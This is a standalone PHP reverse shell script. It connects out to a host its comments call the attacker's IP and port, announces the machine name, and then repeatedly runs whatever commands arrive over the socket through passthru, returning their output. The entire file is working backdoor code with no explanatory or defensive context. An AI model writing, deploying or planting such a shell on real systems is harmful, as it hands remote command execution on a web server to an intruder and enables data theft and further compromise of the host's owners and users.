<?php
$computer_name = php_uname('n');
$ip = '127.0.0.1';  // Attacker's IP address
$port = 443;     // Attacker's listening port

// Create a socket
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($sock === false) {
    die("Socket creation failed: " . socket_strerror(socket_last_error()));
}

// Connect to the attacker
if (socket_connect($sock, $ip, $port) === false) {
    die("Socket connection failed: " . socket_strerror(socket_last_error()));
}

// Write banner (optional)
socket_write($sock, "Connected to $computer_name\n");

// Use passthru to execute cmd.exe and capture real-time output
while (true) {
    // Prepare the sockets for reading (the client connection)
    $read = [$sock];
    $write = null;
    $except = null;
    
    // Use socket_select to wait for incoming data from the client (Netcat)
    if (socket_select($read, $write, $except, null) > 0) {
        // Read the input sent by the attacker
        $input = socket_read($sock, 2048, PHP_NORMAL_READ);
        if ($input === false || trim($input) === '') {
            // If no input, terminate the shell
            break;
        }
        
        // Execute the command and send the output back to the client
        $output = '';
        ob_start();
        passthru(trim($input) . ' 2>&1');  // Execute command, capture output
        $output = ob_get_clean();
        
        // Send the command output back to the attacker
        socket_write($sock, $output);
    }
}

// Close the socket
socket_close($sock);
?>
